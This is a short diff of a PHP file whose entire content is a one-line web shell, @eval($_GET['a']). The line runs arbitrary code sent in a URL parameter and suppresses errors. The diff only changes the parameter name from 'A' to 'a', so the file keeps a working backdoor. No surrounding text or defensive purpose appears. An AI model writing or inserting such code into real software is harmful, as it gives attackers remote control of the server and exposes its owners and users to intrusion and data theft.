@@ -1,3 +1,3 @@
 <?php
-@eval($_GET['A']);
+@eval($_GET['a']);
 ?>
